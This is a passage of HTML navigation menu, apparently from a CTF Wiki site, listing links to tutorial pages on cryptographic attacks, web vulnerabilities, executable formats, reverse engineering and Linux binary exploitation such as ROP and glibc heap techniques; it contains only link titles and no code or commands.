    <a href="../../../../crypto/asymmetric/rsa/rsa_e_attack-zh/" class="md-nav__link">
      Public Key Index Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_d_attack-zh/" class="md-nav__link">
      Private Key d Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_coppersmith_attack-zh/" class="md-nav__link">
      Coppersmith Related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/" class="md-nav__link">
      Chosen Plain Cipher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_side_channel-zh/" class="md-nav__link">
      Side Channel Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_pkcs_attack-zh/" class="md-nav__link">
      Bleichenbacher Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/knapsack/knapsack-zh/" class="md-nav__link">
      Knapsack Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-4" type="checkbox" id="nav-3-6-4">
    
    <label class="md-nav__link" for="nav-3-6-4">
      Discrete Log Correlation
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Discrete Log Correlation" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-4">
        <span class="md-nav__icon md-icon"></span>
        Discrete Log Correlation
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/discrete-log-zh/" class="md-nav__link">
      Discrete Logarithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/elgamal-zh/" class="md-nav__link">
      Elgamal
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/discrete-log/ecc-zh/" class="md-nav__link">
      ECC
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-5" type="checkbox" id="nav-3-6-5">
    
    <label class="md-nav__link" for="nav-3-6-5">
      Lattice-based Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Lattice-based Cryptography" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-5">
        <span class="md-nav__icon md-icon"></span>
        Lattice-based Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/overview-zh/" class="md-nav__link">
      Lattice Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/introduction-zh/" class="md-nav__link">
      Introduction to Lattices
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/lattice-reduction-zh/" class="md-nav__link">
      Lattice-based Algorithm
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/lattice/cvp-zh/" class="md-nav__link">
      CVP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-7" type="checkbox" id="nav-3-7">
    
    <label class="md-nav__link" for="nav-3-7">
      Hash Function
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Hash Function" data-md-level="2">
      <label class="md-nav__title" for="nav-3-7">
        <span class="md-nav__icon md-icon"></span>
        Hash Function
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/introduction-zh/" class="md-nav__link">
      Introduction to the Hash Function
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/md5-zh/" class="md-nav__link">
      MD5
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/sha1-zh/" class="md-nav__link">
      SHA1
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/fnv-zh/" class="md-nav__link">
      FNV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/attack-zh/" class="md-nav__link">
      Hash Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/hash/complex-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-8" type="checkbox" id="nav-3-8">
    
    <label class="md-nav__link" for="nav-3-8">
      Digital Signature
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Digital Signature" data-md-level="2">
      <label class="md-nav__title" for="nav-3-8">
        <span class="md-nav__icon md-icon"></span>
        Digital Signature
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/introduction-zh/" class="md-nav__link">
      Introduction to Digital Signatures
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/rsa-zh/" class="md-nav__link">
      RSA Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/elgamal-zh/" class="md-nav__link">
      ElGamal Digital Signature
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/signature/dsa-zh/" class="md-nav__link">
      DSA Digital Signature
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-9" type="checkbox" id="nav-3-9">
    
    <label class="md-nav__link" for="nav-3-9">
      Summary of Attack Techniques
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Summary of Attack Techniques" data-md-level="2">
      <label class="md-nav__title" for="nav-3-9">
        <span class="md-nav__icon md-icon"></span>
        Summary of Attack Techniques
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/attack-mode-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/meet-in-the-middle-zh/" class="md-nav__link">
      Intermediate Encounter Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/attack-summary/bit-attack-zh/" class="md-nav__link">
      Bit attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/certificate/introduction-zh/" class="md-nav__link">
      Certificate Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      Web
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Web" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        <span class="md-nav__icon md-icon"></span>
        Web
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/introduction-zh/" class="md-nav__link">
      Introduction to Web Applications
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/sqli-zh/" class="md-nav__link">
      SQL Injection
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/xss-zh/" class="md-nav__link">
      XSS Cross-site Scripting Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/csrf-zh/" class="md-nav__link">
      CSRF Cross-site Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/ssrf-zh/" class="md-nav__link">
      SSRF Server Request Forgery
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../web/php/php-zh/" class="md-nav__link">
      PHP Code Auditing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      Assembly
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Assembly" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        <span class="md-nav__icon md-icon"></span>
        Assembly
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/x86-x64/readme-zh/" class="md-nav__link">
      x86_x64
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/mips/readme-zh/" class="md-nav__link">
      mips
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../assembly/arm/readme-zh/" class="md-nav__link">
      arm
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      Executable
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Executable" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        <span class="md-nav__icon md-icon"></span>
        Executable
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-1" type="checkbox" id="nav-6-1">
    
    <label class="md-nav__link" for="nav-6-1">
      ELF file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="ELF file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-1">
        <span class="md-nav__icon md-icon"></span>
        ELF file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/elf-structure-zh/" class="md-nav__link">
      ELF File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-loading-zh/" class="md-nav__link">
      Program Loading
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/program-linking-zh/" class="md-nav__link">
      Program Link
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/elf/running-overview-zh/" class="md-nav__link">
      Program Execution Flow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
    
    <label class="md-nav__link" for="nav-6-2">
      PE file
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="PE file" data-md-level="2">
      <label class="md-nav__title" for="nav-6-2">
        <span class="md-nav__icon md-icon"></span>
        PE file
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-excutable-zh/" class="md-nav__link">
      PE File Basic Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-import-table-zh/" class="md-nav__link">
      PE Import Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-export-table-zh/" class="md-nav__link">
      PE Export Table
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../executable/pe/pe-relocation-table-zh/" class="md-nav__link">
      PE Relocation Table
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
    
    <label class="md-nav__link" for="nav-7">
      Reverse Engineering
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        <span class="md-nav__icon md-icon"></span>
        Reverse Engineering
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-1" type="checkbox" id="nav-7-1">
    
    <label class="md-nav__link" for="nav-7-1">
      Reverse Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Reverse Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-7-1">
        <span class="md-nav__icon md-icon"></span>
        Reverse Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/introduction-zh/" class="md-nav__link">
      Software Reverse Engineering Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/Identify-Encode-Encryption/introduction-zh/" class="md-nav__link">
      Common Encryption Algorithms and Code Recognition
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/maze/maze-zh/" class="md-nav__link">
      Labyrinth Problem
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/vm/vm-zh/" class="md-nav__link">
      Virtual Machine Command Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/unicorn/introduction-zh/" class="md-nav__link">
      Unicorn Engine Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2" type="checkbox" id="nav-7-2">
    
    <label class="md-nav__link" for="nav-7-2">
      Linux Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-2-1" type="checkbox" id="nav-7-2-1">
    
    <label class="md-nav__link" for="nav-7-2-1">
      Linux Reverse Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Reverse Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-2-1">
        <span class="md-nav__icon md-icon"></span>
        Linux Reverse Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/ld_preload-zh/" class="md-nav__link">
      LD_PRELOAD
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/false-disasm-zh/" class="md-nav__link">
      Incorrect Disassembly Fix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-bp-zh/" class="md-nav__link">
      Detecting Breakpoints Bypassing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/linux/detect-dbg-zh/" class="md-nav__link">
      Detecting Debugging Bypassing
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
    
    <label class="md-nav__link" for="nav-7-3">
      Windows Reverse
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Windows Reverse" data-md-level="2">
      <label class="md-nav__title" for="nav-7-3">
        <span class="md-nav__icon md-icon"></span>
        Windows Reverse
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-1" type="checkbox" id="nav-7-3-1">
    
    <label class="md-nav__link" for="nav-7-3-1">
      Shelling Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Shelling Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-1">
        <span class="md-nav__icon md-icon"></span>
        Shelling Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/packer-introduction-zh/" class="md-nav__link">
      Introduction to the Protective case
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/trace-zh/" class="md-nav__link">
      Single Step Tracking Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/esp-zh/" class="md-nav__link">
      ESP Law
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/direct-oep-zh/" class="md-nav__link">
      One Step to the OEP Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/memory-zh/" class="md-nav__link">
      Memory Mirroring Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/last-exception-zh/" class="md-nav__link">
      Last Exception Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/sfx-zh/" class="md-nav__link">
      SFX Method
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/fix-iat-zh/" class="md-nav__link">
      DUMP and IAT Reconstruction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/manually-fix-iat-zh/" class="md-nav__link">
      Manually Find the IAT and Rebuild It Using ImportREC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/unpack/unpack-dll-zh/" class="md-nav__link">
      DLL File Unpacking
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-7-3-2" type="checkbox" id="nav-7-3-2">
    
    <label class="md-nav__link" for="nav-7-3-2">
      Anti-debugging Technology
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Anti-debugging Technology" data-md-level="3">
      <label class="md-nav__title" for="nav-7-3-2">
        <span class="md-nav__icon md-icon"></span>
        Anti-debugging Technology
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntglobalflag-zh/" class="md-nav__link">
      NtGlobalFlag
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/heap-flags-zh/" class="md-nav__link">
      Heap Flags
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/the-heap-zh/" class="md-nav__link">
      The Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/int-3-zh/" class="md-nav__link">
      Interrupt 3
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/isdebuggerpresent-zh/" class="md-nav__link">
      IsDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/checkremotedebuggerpresent-zh/" class="md-nav__link">
      CheckRemoteDebuggerPresent
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/ntqueryinformationprocess-zh/" class="md-nav__link">
      NtQueryInformationProcess
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/zwsetinformationthread-zh/" class="md-nav__link">
      ZwSetInformationThread
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/junk-code-zh/" class="md-nav__link">
      Flower command
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../reverse/windows/anti-debug/example-zh/" class="md-nav__link">
      Anti-debug technical example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8" type="checkbox" id="nav-8">
    
    <label class="md-nav__link" for="nav-8">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-8">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-1" type="checkbox" id="nav-8-1">
    
    <label class="md-nav__link" for="nav-8-1">
      Pwn Overview
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn Overview" data-md-level="2">
      <label class="md-nav__title" for="nav-8-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn Overview
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../readme-zh/" class="md-nav__link">
      Readme zh
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2" type="checkbox" id="nav-8-2">
    
    <label class="md-nav__link" for="nav-8-2">
      Linux Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linux Pwn" data-md-level="2">
      <label class="md-nav__title" for="nav-8-2">
        <span class="md-nav__icon md-icon"></span>
        Linux Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-1" type="checkbox" id="nav-8-2-1">
    
    <label class="md-nav__link" for="nav-8-2-1">
      Security Protection Mechanism
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Security Protection Mechanism" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-1">
        <span class="md-nav__icon md-icon"></span>
        Security Protection Mechanism
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../mitigation/canary-zh/" class="md-nav__link">
      Canary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-2" type="checkbox" id="nav-8-2-2">
    
    <label class="md-nav__link" for="nav-8-2-2">
      Stack Overflow
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stack Overflow" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-2">
        <span class="md-nav__icon md-icon"></span>
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../stack-intro-zh/" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../stackoverflow-basic-zh/" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../basic-rop-zh/" class="md-nav__link">
      Basic ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../medium-rop-zh/" class="md-nav__link">
      Intermediate ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../advanced-rop-zh/" class="md-nav__link">
      Advanced ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../fancy-rop-zh/" class="md-nav__link">
      ROP Tricks
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-3" type="checkbox" id="nav-8-2-3">
    
    <label class="md-nav__link" for="nav-8-2-3">
      Format String Vulnerability
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Format String Vulnerability" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-3">
        <span class="md-nav__icon md-icon"></span>
        Format String Vulnerability
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro-zh/" class="md-nav__link">
      Format String Vulnerability Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit-zh/" class="md-nav__link">
      Format String Exploit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example-zh/" class="md-nav__link">
      Format String Vulnerability Example
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect-zh/" class="md-nav__link">
      Format String Vulnerability Detection
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4" type="checkbox" id="nav-8-2-4">
    
    <label class="md-nav__link" for="nav-8-2-4">
      Glibc Heap Related
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Glibc Heap Related" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-4">
        <span class="md-nav__icon md-icon"></span>
        Glibc Heap Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/introduction-zh/" class="md-nav__link">
      Introduction to Heap
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heap_overview-zh/" class="md-nav__link">
      Heap Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heap_structure-zh/" class="md-nav__link">
      Heap Related Data Structure
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-8-2-4-4" type="checkbox" id="nav-8-2-4-4">
    
    <label class="md-nav__link" for="nav-8-2-4-4">
      In-depth Understanding of Ptmalloc2
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="In-depth Understanding of Ptmalloc2" data-md-level="4">
      <label class="md-nav__title" for="nav-8-2-4-4">
        <span class="md-nav__icon md-icon"></span>
        In-depth Understanding of Ptmalloc2
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/overview-zh/" class="md-nav__link">
      Implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/basic-zh/" class="md-nav__link">
      Basic Functions in the heap implementation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/heap-init-zh/" class="md-nav__link">
      Heap Initialization
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/malloc-zh/" class="md-nav__link">
      Allocate Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/free-zh/" class="md-nav__link">
      Free Heap Memory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/tcache-zh/" class="md-nav__link">
      Tcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/malloc_state-zh/" class="md-nav__link">
      malloc_state
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/implementation/misc-zh/" class="md-nav__link">
      Other
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/heapoverflow_basic-zh/" class="md-nav__link">
      Heap Overflow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/off_by_one-zh/" class="md-nav__link">
      Heap-based Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/chunk_extend_overlapping-zh/" class="md-nav__link">
      Chunk Extend/Overlapping
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../glibc-heap/unlink-zh/" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          
